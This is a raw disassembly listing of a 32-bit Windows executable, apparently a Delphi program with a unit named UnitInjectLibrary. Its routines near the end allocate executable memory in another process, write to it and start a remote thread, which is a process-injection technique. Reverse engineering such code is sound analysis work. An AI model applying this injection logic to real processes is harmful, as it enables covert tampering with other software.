  40489a:	e8 b5 e2 ff ff       	call   0x402b54
  40489f:	e8 b0 d1 ff ff       	call   0x401a54
  4048a4:	33 c0                	xor    %eax,%eax
  4048a6:	5a                   	pop    %edx
  4048a7:	59                   	pop    %ecx
  4048a8:	59                   	pop    %ecx
  4048a9:	64 89 10             	mov    %edx,%fs:(%eax)
  4048ac:	68 b9 48 40 00       	push   $0x4048b9
  4048b1:	c3                   	ret
  4048b2:	e9 0d e9 ff ff       	jmp    0x4031c4
  4048b7:	eb f8                	jmp    0x4048b1
  4048b9:	5d                   	pop    %ebp
  4048ba:	c3                   	ret
  4048bb:	90                   	nop
  4048bc:	83 2d a4 b5 40 00 01 	subl   $0x1,0x40b5a4
  4048c3:	0f 83 c5 00 00 00    	jae    0x40498e
  4048c9:	c6 05 08 a0 40 00 02 	movb   $0x2,0x40a008
  4048d0:	c7 05 10 b0 40 00 68 	movl   $0x401068,0x40b010
  4048d7:	10 40 00 
  4048da:	c7 05 14 b0 40 00 70 	movl   $0x401070,0x40b014
  4048e1:	10 40 00 
  4048e4:	c6 05 36 b0 40 00 02 	movb   $0x2,0x40b036
  4048eb:	c7 05 00 b0 40 00 0c 	movl   $0x40420c,0x40b000
  4048f2:	42 40 00 
  4048f5:	e8 de e3 ff ff       	call   0x402cd8
  4048fa:	84 c0                	test   %al,%al
  4048fc:	74 05                	je     0x404903
  4048fe:	e8 05 e4 ff ff       	call   0x402d08
  404903:	e8 c4 e4 ff ff       	call   0x402dcc
  404908:	66 c7 05 3c b0 40 00 	movw   $0xd7b0,0x40b03c
  40490f:	b0 d7 
  404911:	66 c7 05 08 b2 40 00 	movw   $0xd7b0,0x40b208
  404918:	b0 d7 
  40491a:	66 c7 05 d4 b3 40 00 	movw   $0xd7b0,0x40b3d4
  404921:	b0 d7 
  404923:	e8 80 c7 ff ff       	call   0x4010a8
  404928:	a3 2c b0 40 00       	mov    %eax,0x40b02c
  40492d:	e8 de c7 ff ff       	call   0x401110
  404932:	a3 28 b0 40 00       	mov    %eax,0x40b028
  404937:	e8 cc c7 ff ff       	call   0x401108
  40493c:	25 00 00 00 80       	and    $0x80000000,%eax
  404941:	3d 00 00 00 80       	cmp    $0x80000000,%eax
  404946:	74 2d                	je     0x404975
  404948:	e8 bb c7 ff ff       	call   0x401108
  40494d:	25 ff 00 00 00       	and    $0xff,%eax
  404952:	66 83 f8 04          	cmp    $0x4,%ax
  404956:	76 0c                	jbe    0x404964
  404958:	c7 05 a8 b5 40 00 03 	movl   $0x3,0x40b5a8
  40495f:	00 00 00 
  404962:	eb 20                	jmp    0x404984
  404964:	e8 5f c7 ff ff       	call   0x4010c8
  404969:	e8 86 fe ff ff       	call   0x4047f4
  40496e:	a3 a8 b5 40 00       	mov    %eax,0x40b5a8
  404973:	eb 0f                	jmp    0x404984
  404975:	e8 4e c7 ff ff       	call   0x4010c8
  40497a:	e8 75 fe ff ff       	call   0x4047f4
  40497f:	a3 a8 b5 40 00       	mov    %eax,0x40b5a8
  404984:	e8 77 c7 ff ff       	call   0x401100
  404989:	a3 20 b0 40 00       	mov    %eax,0x40b020
  40498e:	c3                   	ret
  40498f:	90                   	nop
  404990:	ff 25 4c c1 40 00    	jmp    *0x40c14c
  404996:	8b c0                	mov    %eax,%eax
  404998:	ff 25 48 c1 40 00    	jmp    *0x40c148
  40499e:	8b c0                	mov    %eax,%eax
  4049a0:	ff 25 44 c1 40 00    	jmp    *0x40c144
  4049a6:	8b c0                	mov    %eax,%eax
  4049a8:	ff 25 40 c1 40 00    	jmp    *0x40c140
  4049ae:	8b c0                	mov    %eax,%eax
  4049b0:	50                   	push   %eax
  4049b1:	6a 40                	push   $0x40
  4049b3:	e8 e0 ff ff ff       	call   0x404998
  4049b8:	c3                   	ret
  4049b9:	8d 40 00             	lea    0x0(%eax),%eax
  4049bc:	b8 08 00 00 00       	mov    $0x8,%eax
  4049c1:	c3                   	ret
  4049c2:	8b c0                	mov    %eax,%eax
  4049c4:	53                   	push   %ebx
  4049c5:	e8 f2 ff ff ff       	call   0x4049bc
  4049ca:	8b d8                	mov    %eax,%ebx
  4049cc:	85 db                	test   %ebx,%ebx
  4049ce:	74 36                	je     0x404a06
  4049d0:	83 3d 90 a0 40 00 ff 	cmpl   $0xffffffff,0x40a090
  4049d7:	75 0a                	jne    0x4049e3
  4049d9:	b8 e2 00 00 00       	mov    $0xe2,%eax
  4049de:	e8 61 ed ff ff       	call   0x403744
  4049e3:	8b c3                	mov    %ebx,%eax
  4049e5:	e8 c6 ff ff ff       	call   0x4049b0
  4049ea:	85 c0                	test   %eax,%eax
  4049ec:	75 0c                	jne    0x4049fa
  4049ee:	b8 e2 00 00 00       	mov    $0xe2,%eax
  4049f3:	e8 4c ed ff ff       	call   0x403744
  4049f8:	eb 0c                	jmp    0x404a06
  4049fa:	50                   	push   %eax
  4049fb:	a1 90 a0 40 00       	mov    0x40a090,%eax
  404a00:	50                   	push   %eax
  404a01:	e8 a2 ff ff ff       	call   0x4049a8
  404a06:	5b                   	pop    %ebx
  404a07:	c3                   	ret
  404a08:	8a 0d 4c b6 40 00    	mov    0x40b64c,%cl
  404a0e:	a1 90 a0 40 00       	mov    0x40a090,%eax
  404a13:	84 c9                	test   %cl,%cl
  404a15:	75 26                	jne    0x404a3d
  404a17:	64 8b 15 2c 00 00 00 	mov    %fs:0x2c,%edx
  404a1e:	8b 04 82             	mov    (%edx,%eax,4),%eax
  404a21:	c3                   	ret
  404a22:	e8 9d ff ff ff       	call   0x4049c4
  404a27:	a1 90 a0 40 00       	mov    0x40a090,%eax
  404a2c:	50                   	push   %eax
  404a2d:	e8 6e ff ff ff       	call   0x4049a0
  404a32:	85 c0                	test   %eax,%eax
  404a34:	74 01                	je     0x404a37
  404a36:	c3                   	ret
  404a37:	a1 58 b6 40 00       	mov    0x40b658,%eax
  404a3c:	c3                   	ret
  404a3d:	50                   	push   %eax
  404a3e:	e8 5d ff ff ff       	call   0x4049a0
  404a43:	85 c0                	test   %eax,%eax
  404a45:	74 db                	je     0x404a22
  404a47:	c3                   	ret
  404a48:	b8 94 a0 40 00       	mov    $0x40a094,%eax
  404a4d:	e8 be fc ff ff       	call   0x404710
  404a52:	c3                   	ret
  404a53:	90                   	nop
  404a54:	53                   	push   %ebx
  404a55:	8b d8                	mov    %eax,%ebx
  404a57:	33 c0                	xor    %eax,%eax
  404a59:	a3 90 a0 40 00       	mov    %eax,0x40a090
  404a5e:	6a 00                	push   $0x0
  404a60:	e8 2b ff ff ff       	call   0x404990
  404a65:	a3 50 b6 40 00       	mov    %eax,0x40b650
  404a6a:	a1 50 b6 40 00       	mov    0x40b650,%eax
  404a6f:	a3 98 a0 40 00       	mov    %eax,0x40a098
  404a74:	33 c0                	xor    %eax,%eax
  404a76:	a3 9c a0 40 00       	mov    %eax,0x40a09c
  404a7b:	33 c0                	xor    %eax,%eax
  404a7d:	a3 a0 a0 40 00       	mov    %eax,0x40a0a0
  404a82:	e8 c1 ff ff ff       	call   0x404a48
  404a87:	ba 94 a0 40 00       	mov    $0x40a094,%edx
  404a8c:	8b c3                	mov    %ebx,%eax
  404a8e:	e8 6d ea ff ff       	call   0x403500
  404a93:	5b                   	pop    %ebx
  404a94:	c3                   	ret
  404a95:	8d 40 00             	lea    0x0(%eax),%eax
  404a98:	55                   	push   %ebp
  404a99:	8b ec                	mov    %esp,%ebp
  404a9b:	33 c0                	xor    %eax,%eax
  404a9d:	55                   	push   %ebp
  404a9e:	68 bd 4a 40 00       	push   $0x404abd
  404aa3:	64 ff 30             	push   %fs:(%eax)
  404aa6:	64 89 20             	mov    %esp,%fs:(%eax)
  404aa9:	ff 05 54 b6 40 00    	incl   0x40b654
  404aaf:	33 c0                	xor    %eax,%eax
  404ab1:	5a                   	pop    %edx
  404ab2:	59                   	pop    %ecx
  404ab3:	59                   	pop    %ecx
  404ab4:	64 89 10             	mov    %edx,%fs:(%eax)
  404ab7:	68 c4 4a 40 00       	push   $0x404ac4
  404abc:	c3                   	ret
  404abd:	e9 02 e7 ff ff       	jmp    0x4031c4
  404ac2:	eb f8                	jmp    0x404abc
  404ac4:	5d                   	pop    %ebp
  404ac5:	c3                   	ret
  404ac6:	8b c0                	mov    %eax,%eax
  404ac8:	83 2d 54 b6 40 00 01 	subl   $0x1,0x40b654
  404acf:	c3                   	ret
  404ad0:	55                   	push   %ebp
  404ad1:	8b ec                	mov    %esp,%ebp
  404ad3:	33 c0                	xor    %eax,%eax
  404ad5:	55                   	push   %ebp
  404ad6:	68 f5 4a 40 00       	push   $0x404af5
  404adb:	64 ff 30             	push   %fs:(%eax)
  404ade:	64 89 20             	mov    %esp,%fs:(%eax)
  404ae1:	ff 05 5c b6 40 00    	incl   0x40b65c
  404ae7:	33 c0                	xor    %eax,%eax
  404ae9:	5a                   	pop    %edx
  404aea:	59                   	pop    %ecx
  404aeb:	59                   	pop    %ecx
  404aec:	64 89 10             	mov    %edx,%fs:(%eax)
  404aef:	68 fc 4a 40 00       	push   $0x404afc
  404af4:	c3                   	ret
  404af5:	e9 ca e6 ff ff       	jmp    0x4031c4
  404afa:	eb f8                	jmp    0x404af4
  404afc:	5d                   	pop    %ebp
  404afd:	c3                   	ret
  404afe:	8b c0                	mov    %eax,%eax
  404b00:	83 2d 5c b6 40 00 01 	subl   $0x1,0x40b65c
  404b07:	c3                   	ret
  404b08:	ff 25 70 c1 40 00    	jmp    *0x40c170
  404b0e:	8b c0                	mov    %eax,%eax
  404b10:	ff 25 6c c1 40 00    	jmp    *0x40c16c
  404b16:	8b c0                	mov    %eax,%eax
  404b18:	ff 25 68 c1 40 00    	jmp    *0x40c168
  404b1e:	8b c0                	mov    %eax,%eax
  404b20:	ff 25 64 c1 40 00    	jmp    *0x40c164
  404b26:	8b c0                	mov    %eax,%eax
  404b28:	ff 25 60 c1 40 00    	jmp    *0x40c160
  404b2e:	8b c0                	mov    %eax,%eax
  404b30:	ff 25 5c c1 40 00    	jmp    *0x40c15c
  404b36:	8b c0                	mov    %eax,%eax
  404b38:	ff 25 58 c1 40 00    	jmp    *0x40c158
  404b3e:	8b c0                	mov    %eax,%eax
  404b40:	ff 25 54 c1 40 00    	jmp    *0x40c154
  404b46:	8b c0                	mov    %eax,%eax
  404b48:	ff 25 04 c2 40 00    	jmp    *0x40c204
  404b4e:	8b c0                	mov    %eax,%eax
  404b50:	ff 25 00 c2 40 00    	jmp    *0x40c200
  404b56:	8b c0                	mov    %eax,%eax
  404b58:	ff 25 fc c1 40 00    	jmp    *0x40c1fc
  404b5e:	8b c0                	mov    %eax,%eax
  404b60:	ff 25 f8 c1 40 00    	jmp    *0x40c1f8
  404b66:	8b c0                	mov    %eax,%eax
  404b68:	ff 25 f8 c1 40 00    	jmp    *0x40c1f8
  404b6e:	8b c0                	mov    %eax,%eax
  404b70:	ff 25 f4 c1 40 00    	jmp    *0x40c1f4
  404b76:	8b c0                	mov    %eax,%eax
  404b78:	55                   	push   %ebp
  404b79:	8b ec                	mov    %esp,%ebp
  404b7b:	8b 45 10             	mov    0x10(%ebp),%eax
  404b7e:	50                   	push   %eax
  404b7f:	83 7d 0c 01          	cmpl   $0x1,0xc(%ebp)
  404b83:	1b c0                	sbb    %eax,%eax
  404b85:	40                   	inc    %eax
  404b86:	83 e0 7f             	and    $0x7f,%eax
  404b89:	50                   	push   %eax
  404b8a:	8b 45 08             	mov    0x8(%ebp),%eax
  404b8d:	50                   	push   %eax
  404b8e:	e8 dd ff ff ff       	call   0x404b70
  404b93:	5d                   	pop    %ebp
  404b94:	c2 0c 00             	ret    $0xc
  404b97:	90                   	nop
  404b98:	ff 25 f0 c1 40 00    	jmp    *0x40c1f0
  404b9e:	8b c0                	mov    %eax,%eax
  404ba0:	ff 25 ec c1 40 00    	jmp    *0x40c1ec
  404ba6:	8b c0                	mov    %eax,%eax
  404ba8:	ff 25 e8 c1 40 00    	jmp    *0x40c1e8
  404bae:	8b c0                	mov    %eax,%eax
  404bb0:	ff 25 e4 c1 40 00    	jmp    *0x40c1e4
  404bb6:	8b c0                	mov    %eax,%eax
  404bb8:	ff 25 e0 c1 40 00    	jmp    *0x40c1e0
  404bbe:	8b c0                	mov    %eax,%eax
  404bc0:	ff 25 dc c1 40 00    	jmp    *0x40c1dc
  404bc6:	8b c0                	mov    %eax,%eax
  404bc8:	ff 25 d8 c1 40 00    	jmp    *0x40c1d8
  404bce:	8b c0                	mov    %eax,%eax
  404bd0:	ff 25 d4 c1 40 00    	jmp    *0x40c1d4
  404bd6:	8b c0                	mov    %eax,%eax
  404bd8:	ff 25 d0 c1 40 00    	jmp    *0x40c1d0
  404bde:	8b c0                	mov    %eax,%eax
  404be0:	ff 25 cc c1 40 00    	jmp    *0x40c1cc
  404be6:	8b c0                	mov    %eax,%eax
  404be8:	ff 25 c8 c1 40 00    	jmp    *0x40c1c8
  404bee:	8b c0                	mov    %eax,%eax
  404bf0:	ff 25 c4 c1 40 00    	jmp    *0x40c1c4
  404bf6:	8b c0                	mov    %eax,%eax
  404bf8:	ff 25 c0 c1 40 00    	jmp    *0x40c1c0
  404bfe:	8b c0                	mov    %eax,%eax
  404c00:	ff 25 bc c1 40 00    	jmp    *0x40c1bc
  404c06:	8b c0                	mov    %eax,%eax
  404c08:	ff 25 b8 c1 40 00    	jmp    *0x40c1b8
  404c0e:	8b c0                	mov    %eax,%eax
  404c10:	ff 25 b4 c1 40 00    	jmp    *0x40c1b4
  404c16:	8b c0                	mov    %eax,%eax
  404c18:	ff 25 b0 c1 40 00    	jmp    *0x40c1b0
  404c1e:	8b c0                	mov    %eax,%eax
  404c20:	ff 25 ac c1 40 00    	jmp    *0x40c1ac
  404c26:	8b c0                	mov    %eax,%eax
  404c28:	ff 25 a8 c1 40 00    	jmp    *0x40c1a8
  404c2e:	8b c0                	mov    %eax,%eax
  404c30:	ff 25 a4 c1 40 00    	jmp    *0x40c1a4
  404c36:	8b c0                	mov    %eax,%eax
  404c38:	ff 25 a0 c1 40 00    	jmp    *0x40c1a0
  404c3e:	8b c0                	mov    %eax,%eax
  404c40:	ff 25 9c c1 40 00    	jmp    *0x40c19c
  404c46:	8b c0                	mov    %eax,%eax
  404c48:	ff 25 98 c1 40 00    	jmp    *0x40c198
  404c4e:	8b c0                	mov    %eax,%eax
  404c50:	ff 25 94 c1 40 00    	jmp    *0x40c194
  404c56:	8b c0                	mov    %eax,%eax
  404c58:	ff 25 90 c1 40 00    	jmp    *0x40c190
  404c5e:	8b c0                	mov    %eax,%eax
  404c60:	ff 25 8c c1 40 00    	jmp    *0x40c18c
  404c66:	8b c0                	mov    %eax,%eax
  404c68:	ff 25 88 c1 40 00    	jmp    *0x40c188
  404c6e:	8b c0                	mov    %eax,%eax
  404c70:	ff 25 84 c1 40 00    	jmp    *0x40c184
  404c76:	8b c0                	mov    %eax,%eax
  404c78:	ff 25 80 c1 40 00    	jmp    *0x40c180
  404c7e:	8b c0                	mov    %eax,%eax
  404c80:	ff 25 7c c1 40 00    	jmp    *0x40c17c
  404c86:	8b c0                	mov    %eax,%eax
  404c88:	ff 25 78 c1 40 00    	jmp    *0x40c178
  404c8e:	8b c0                	mov    %eax,%eax
  404c90:	ff 25 14 c2 40 00    	jmp    *0x40c214
  404c96:	8b c0                	mov    %eax,%eax
  404c98:	ff 25 18 c2 40 00    	jmp    *0x40c218
  404c9e:	8b c0                	mov    %eax,%eax
  404ca0:	ff 25 10 c2 40 00    	jmp    *0x40c210
  404ca6:	8b c0                	mov    %eax,%eax
  404ca8:	ff 25 0c c2 40 00    	jmp    *0x40c20c
  404cae:	8b c0                	mov    %eax,%eax
  404cb0:	92                   	xchg   %eax,%edx
  404cb1:	e8 8a dc ff ff       	call   0x402940
  404cb6:	c3                   	ret
  404cb7:	90                   	nop
  404cb8:	33 c9                	xor    %ecx,%ecx
  404cba:	e8 ed de ff ff       	call   0x402bac
  404cbf:	c3                   	ret
  404cc0:	55                   	push   %ebp
  404cc1:	8b ec                	mov    %esp,%ebp
  404cc3:	33 c0                	xor    %eax,%eax
  404cc5:	55                   	push   %ebp
  404cc6:	68 e5 4c 40 00       	push   $0x404ce5
  404ccb:	64 ff 30             	push   %fs:(%eax)
  404cce:	64 89 20             	mov    %esp,%fs:(%eax)
  404cd1:	ff 05 60 b6 40 00    	incl   0x40b660
  404cd7:	33 c0                	xor    %eax,%eax
  404cd9:	5a                   	pop    %edx
  404cda:	59                   	pop    %ecx
  404cdb:	59                   	pop    %ecx
  404cdc:	64 89 10             	mov    %edx,%fs:(%eax)
  404cdf:	68 ec 4c 40 00       	push   $0x404cec
  404ce4:	c3                   	ret
  404ce5:	e9 da e4 ff ff       	jmp    0x4031c4
  404cea:	eb f8                	jmp    0x404ce4
  404cec:	5d                   	pop    %ebp
  404ced:	c3                   	ret
  404cee:	8b c0                	mov    %eax,%eax
  404cf0:	83 2d 60 b6 40 00 01 	subl   $0x1,0x40b660
  404cf7:	c3                   	ret
  404cf8:	fc                   	cld
  404cf9:	4c                   	dec    %esp
  404cfa:	40                   	inc    %eax
  404cfb:	00 11                	add    %dl,(%ecx)
  404cfd:	0c 54                	or     $0x54,%al
  404cff:	53                   	push   %ebx
  404d00:	74 72                	je     0x404d74
  404d02:	69 6e 67 41 72 72 61 	imul   $0x61727241,0x67(%esi),%ebp
  404d09:	79 04                	jns    0x404d0f
  404d0b:	00 00                	add    %al,(%eax)
  404d0d:	00 00                	add    %al,(%eax)
  404d0f:	10 40 00             	adc    %al,0x0(%eax)
  404d12:	48                   	dec    %eax
  404d13:	00 00                	add    %al,(%eax)
  404d15:	00 00                	add    %al,(%eax)
  404d17:	10 40 00             	adc    %al,0x0(%eax)
  404d1a:	11 55 6e             	adc    %edx,0x6e(%ebp)
  404d1d:	69 74 49 6e 6a 65 63 	imul   $0x7463656a,0x6e(%ecx,%ecx,2),%esi
  404d24:	74 
  404d25:	4c                   	dec    %esp
  404d26:	69 62 72 61 72 79 30 	imul   $0x30797261,0x72(%edx),%esp
  404d2d:	4d                   	dec    %ebp
  404d2e:	40                   	inc    %eax
  404d2f:	00 0e                	add    %cl,(%esi)
  404d31:	08 54 4c 69          	or     %dl,0x69(%esp,%ecx,2)
  404d35:	62 49 6e             	bound  %ecx,0x6e(%ecx)
  404d38:	66 6f                	outsw  %ds:(%esi),(%dx)
  404d3a:	14 00                	adc    $0x0,%al
  404d3c:	00 00                	add    %al,(%eax)
  404d3e:	01 00                	add    %eax,(%eax)
  404d40:	00 00                	add    %al,(%eax)
  404d42:	f8                   	clc
  404d43:	4c                   	dec    %esp
  404d44:	40                   	inc    %eax
  404d45:	00 10                	add    %dl,(%eax)
  404d47:	00 00                	add    %al,(%eax)
  404d49:	00 8b c0 33 d2 42    	add    %cl,0x42d233c0(%ebx)
  404d4f:	8b c8                	mov    %eax,%ecx
  404d51:	03 ca                	add    %edx,%ecx
  404d53:	49                   	dec    %ecx
  404d54:	80 39 c3             	cmpb   $0xc3,(%ecx)
  404d57:	75 f5                	jne    0x404d4e
  404d59:	8b c2                	mov    %edx,%eax
  404d5b:	c3                   	ret
  404d5c:	55                   	push   %ebp
  404d5d:	8b ec                	mov    %esp,%ebp
  404d5f:	6a 00                	push   $0x0
  404d61:	6a 00                	push   $0x0
  404d63:	6a 00                	push   $0x0
  404d65:	53                   	push   %ebx
  404d66:	56                   	push   %esi
  404d67:	57                   	push   %edi
  404d68:	8b da                	mov    %edx,%ebx
  404d6a:	8b f0                	mov    %eax,%esi
  404d6c:	33 c0                	xor    %eax,%eax
  404d6e:	55                   	push   %ebp
  404d6f:	68 da 4d 40 00       	push   $0x404dda
  404d74:	64 ff 30             	push   %fs:(%eax)
  404d77:	64 89 20             	mov    %esp,%fs:(%eax)
  404d7a:	6a 40                	push   $0x40
  404d7c:	68 00 30 00 00       	push   $0x3000
  404d81:	8d 45 f8             	lea    -0x8(%ebp),%eax
  404d84:	8b d3                	mov    %ebx,%edx
  404d86:	e8 e5 ea ff ff       	call   0x403870
  404d8b:	8b 45 f8             	mov    -0x8(%ebp),%eax
  404d8e:	e8 31 eb ff ff       	call   0x4038c4
  404d93:	40                   	inc    %eax
  404d94:	50                   	push   %eax
  404d95:	6a 00                	push   $0x0
  404d97:	56                   	push   %esi
  404d98:	e8 bb fe ff ff       	call   0x404c58
  404d9d:	8b f8                	mov    %eax,%edi
  404d9f:	8d 45 fc             	lea    -0x4(%ebp),%eax
  404da2:	50                   	push   %eax
  404da3:	8d 45 f4             	lea    -0xc(%ebp),%eax
  404da6:	8b d3                	mov    %ebx,%edx
  404da8:	e8 c3 ea ff ff       	call   0x403870
  404dad:	8b 45 f4             	mov    -0xc(%ebp),%eax
  404db0:	e8 0f eb ff ff       	call   0x4038c4
  404db5:	40                   	inc    %eax
  404db6:	50                   	push   %eax
  404db7:	53                   	push   %ebx
  404db8:	57                   	push   %edi
  404db9:	56                   	push   %esi
  404dba:	e8 c1 fe ff ff       	call   0x404c80
  404dbf:	33 c0                	xor    %eax,%eax
  404dc1:	5a                   	pop    %edx
  404dc2:	59                   	pop    %ecx
  404dc3:	59                   	pop    %ecx
  404dc4:	64 89 10             	mov    %edx,%fs:(%eax)
  404dc7:	68 e1 4d 40 00       	push   $0x404de1
  404dcc:	8d 45 f4             	lea    -0xc(%ebp),%eax
  404dcf:	ba 02 00 00 00       	mov    $0x2,%edx
  404dd4:	e8 9b e9 ff ff       	call   0x403774
  404dd9:	c3                   	ret
  404dda:	e9 e5 e3 ff ff       	jmp    0x4031c4
  404ddf:	eb eb                	jmp    0x404dcc
  404de1:	8b c7                	mov    %edi,%eax
  404de3:	5f                   	pop    %edi
  404de4:	5e                   	pop    %esi
  404de5:	5b                   	pop    %ebx
  404de6:	8b e5                	mov    %ebp,%esp
  404de8:	5d                   	pop    %ebp
  404de9:	c3                   	ret
  404dea:	8b c0                	mov    %eax,%eax
  404dec:	53                   	push   %ebx
  404ded:	56                   	push   %esi
  404dee:	57                   	push   %edi
  404def:	55                   	push   %ebp
  404df0:	51                   	push   %ecx
  404df1:	8b f1                	mov    %ecx,%esi
  404df3:	8b ea                	mov    %edx,%ebp
  404df5:	8b d8                	mov    %eax,%ebx
  404df7:	6a 40                	push   $0x40
  404df9:	68 00 30 00 00       	push   $0x3000
  404dfe:	56                   	push   %esi
  404dff:	6a 00                	push   $0x0
  404e01:	53                   	push   %ebx
  404e02:	e8 51 fe ff ff       	call   0x404c58
  404e07:	8b f8                	mov    %eax,%edi
  404e09:	54                   	push   %esp
  404e0a:	56                   	push   %esi
  404e0b:	55                   	push   %ebp
  404e0c:	57                   	push   %edi
  404e0d:	53                   	push   %ebx
  404e0e:	e8 6d fe ff ff       	call   0x404c80
  404e13:	8b c7                	mov    %edi,%eax
  404e15:	5a                   	pop    %edx
  404e16:	5d                   	pop    %ebp
  404e17:	5f                   	pop    %edi
  404e18:	5e                   	pop    %esi
  404e19:	5b                   	pop    %ebx
  404e1a:	c3                   	ret
  404e1b:	90                   	nop
  404e1c:	55                   	push   %ebp
  404e1d:	8b ec                	mov    %esp,%ebp
  404e1f:	83 c4 f4             	add    $0xfffffff4,%esp
  404e22:	53                   	push   %ebx
  404e23:	56                   	push   %esi
  404e24:	57                   	push   %edi
  404e25:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  404e28:	8b fa                	mov    %edx,%edi
  404e2a:	8b d8                	mov    %eax,%ebx
  404e2c:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  404e2f:	8b 55 fc             	mov    -0x4(%ebp),%edx
  404e32:	8b c3                	mov    %ebx,%eax
  404e34:	e8 b3 ff ff ff       	call   0x404dec
  404e39:	8b f0                	mov    %eax,%esi
  404e3b:	8b c7                	mov    %edi,%eax
  404e3d:	e8 0a ff ff ff       	call   0x404d4c
  404e42:	8b c8                	mov    %eax,%ecx
  404e44:	8b d7                	mov    %edi,%edx
  404e46:	8b c3                	mov    %ebx,%eax
  404e48:	e8 9f ff ff ff       	call   0x404dec
  404e4d:	8d 55 f4             	lea    -0xc(%ebp),%edx
  404e50:	52                   	push   %edx
  404e51:	6a 00                	push   $0x0
  404e53:	56                   	push   %esi
  404e54:	50                   	push   %eax
  404e55:	6a 00                	push   $0x0
  404e57:	6a 00                	push   $0x0
  404e59:	53                   	push   %ebx
  404e5a:	e8 41 fd ff ff       	call   0x404ba0
  404e5f:	8b f8                	mov    %eax,%edi
  404e61:	80 7d 08 00          	cmpb   $0x0,0x8(%ebp)
  404e65:	74 1b                	je     0x404e82
  404e67:	6a ff                	push   $0xffffffff
  404e69:	57                   	push   %edi
  404e6a:	e8 01 fe ff ff       	call   0x404c70
  404e6f:	8d 45 f8             	lea    -0x8(%ebp),%eax
  404e72:	50                   	push   %eax
  404e73:	8b 45 0c             	mov    0xc(%ebp),%eax
  404e76:	50                   	push   %eax
  404e77:	8b 45 fc             	mov    -0x4(%ebp),%eax
  404e7a:	50                   	push   %eax
  404e7b:	56                   	push   %esi
  404e7c:	53                   	push   %ebx
  404e7d:	e8 a6 fd ff ff       	call   0x404c28
  404e82:	8b c7                	mov    %edi,%eax
  404e84:	5f                   	pop    %edi
  404e85:	5e                   	pop    %esi
  404e86:	5b                   	pop    %ebx
  404e87:	8b e5                	mov    %ebp,%esp
  404e89:	5d                   	pop    %ebp
  404e8a:	c2 08 00             	ret    $0x8
  404e8d:	8d 40 00             	lea    0x0(%eax),%eax
  404e90:	55                   	push   %ebp
  404e91:	8b ec                	mov    %esp,%ebp
  404e93:	83 c4 f4             	add    $0xfffffff4,%esp
  404e96:	8b 45 08             	mov    0x8(%ebp),%eax
  404e99:	8b 10                	mov    (%eax),%edx
  404e9b:	89 55 f4             	mov    %edx,-0xc(%ebp)
  404e9e:	8b 50 04             	mov    0x4(%eax),%edx
  404ea1:	89 55 f8             	mov    %edx,-0x8(%ebp)
  404ea4:	8b 50 08             	mov    0x8(%eax),%edx
  404ea7:	89 55 fc             	mov    %edx,-0x4(%ebp)
  404eaa:	ff 75 f8             	push   -0x8(%ebp)
  404ead:	ff 55 f4             	call   *-0xc(%ebp)
  404eb0:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  404eb5:	50                   	push   %eax
  404eb6:	ff 55 fc             	call   *-0x4(%ebp)
  404eb9:	eb f5                	jmp    0x404eb0
  404ebb:	8b e5                	mov    %ebp,%esp
  404ebd:	5d                   	pop    %ebp
  404ebe:	c2 04 00             	ret    $0x4
  404ec1:	8d 40 00             	lea    0x0(%eax),%eax
  404ec4:	55                   	push   %ebp
  404ec5:	8b ec                	mov    %esp,%ebp
  404ec7:	83 c4 f0             	add    $0xfffffff0,%esp
  404eca:	53                   	push   %ebx
  404ecb:	56                   	push   %esi
  404ecc:	89 55 fc             	mov    %edx,-0x4(%ebp)
  404ecf:	8b f0                	mov    %eax,%esi
  404ed1:	8b 45 fc             	mov    -0x4(%ebp),%eax
  404ed4:	e8 db eb ff ff       	call   0x403ab4
  404ed9:	33 c0                	xor    %eax,%eax
  404edb:	55                   	push   %ebp
  404edc:	68 62 4f 40 00       	push   $0x404f62
  404ee1:	64 ff 30             	push   %fs:(%eax)
  404ee4:	64 89 20             	mov    %esp,%fs:(%eax)
  404ee7:	33 db                	xor    %ebx,%ebx
  404ee9:	68 74 4f 40 00       	push   $0x404f74
  404eee:	68 7c 4f 40 00       	push   $0x404f7c
  404ef3:	e8 f8 fc ff ff       	call   0x404bf0
  404ef8:	50                   	push   %eax
  404ef9:	e8 fa fc ff ff       	call   0x404bf8
  404efe:	89 45 f8             	mov    %eax,-0x8(%ebp)
  404f01:	68 88 4f 40 00       	push   $0x404f88
  404f06:	68 7c 4f 40 00       	push   $0x404f7c
  404f0b:	e8 e0 fc ff ff       	call   0x404bf0
  404f10:	50                   	push   %eax
  404f11:	e8 e2 fc ff ff       	call   0x404bf8
  404f16:	89 45 f0             	mov    %eax,-0x10(%ebp)
  404f19:	8b 45 fc             	mov    -0x4(%ebp),%eax
  404f1c:	e8 a3 eb ff ff       	call   0x403ac4
  404f21:	8b d0                	mov    %eax,%edx
  404f23:	8b c6                	mov    %esi,%eax
  404f25:	e8 32 fe ff ff       	call   0x404d5c
  404f2a:	89 45 f4             	mov    %eax,-0xc(%ebp)
  404f2d:	6a 0c                	push   $0xc
  404f2f:	6a 00                	push   $0x0
  404f31:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  404f34:	ba 90 4e 40 00       	mov    $0x404e90,%edx
  404f39:	8b c6                	mov    %esi,%eax
  404f3b:	e8 dc fe ff ff       	call   0x404e1c
  404f40:	85 c0                	test   %eax,%eax
  404f42:	74 08                	je     0x404f4c
  404f44:	50                   	push   %eax
  404f45:	e8 fe fb ff ff       	call   0x404b48
  404f4a:	b3 01                	mov    $0x1,%bl
  404f4c:	33 c0                	xor    %eax,%eax
  404f4e:	5a                   	pop    %edx
  404f4f:	59                   	pop    %ecx
  404f50:	59                   	pop    %ecx
  404f51:	64 89 10             	mov    %edx,%fs:(%eax)
  404f54:	68 69 4f 40 00       	push   $0x404f69
  404f59:	8d 45 fc             	lea    -0x4(%ebp),%eax
  404f5c:	e8 ef e7 ff ff       	call   0x403750
  404f61:	c3                   	ret
  404f62:	e9 5d e2 ff ff       	jmp    0x4031c4
  404f67:	eb f0                	jmp    0x404f59
  404f69:	8b c3                	mov    %ebx,%eax
  404f6b:	5e                   	pop    %esi
  404f6c:	5b                   	pop    %ebx
  404f6d:	8b e5                	mov    %ebp,%esp
  404f6f:	5d                   	pop    %ebp
  404f70:	c3                   	ret
  404f71:	00 00                	add    %al,(%eax)
  404f73:	00 53 6c             	add    %dl,0x6c(%ebx)
  404f76:	65 65 70 00          	gs gs jo 0x404f7a
  404f7a:	00 00                	add    %al,(%eax)
  404f7c:	6b 65 72 6e          	imul   $0x6e,0x72(%ebp),%esp
